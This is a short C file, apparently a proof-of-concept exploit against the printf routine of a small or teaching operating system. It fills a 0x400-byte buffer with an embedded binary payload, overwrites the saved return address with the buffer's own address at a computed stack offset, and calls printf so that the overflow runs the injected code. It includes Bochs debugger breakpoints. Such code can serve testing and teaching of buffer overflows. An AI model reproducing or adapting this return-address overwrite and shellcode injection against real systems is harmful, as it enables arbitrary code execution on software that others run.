#include "stdio.h"
#include "type.h"

#include "poc_code.h"

int main() {
	int i;	
	char *p = poc_code_bin;
	u8 str[0x400];
	// printf::buf (ebp - 0x414)
	// start from printf::buf + 0x1d
	for(i = 0; i < 0x3fb; i++) 
		str[i] = i < poc_code_bin_len ? p[i] : '#';
	// retaddr = str	
	*(u8 **)(str + 0x3fb) = str;
	// string end
	str[0x3ff] = 0;
	// magic break
	// asm ("xchg %bx, %bx");
	// fill 0x1d blank
	printf("01234567890123456789012345678%s", str);
	asm ("xchg %bx, %bx");
	return 0;
}
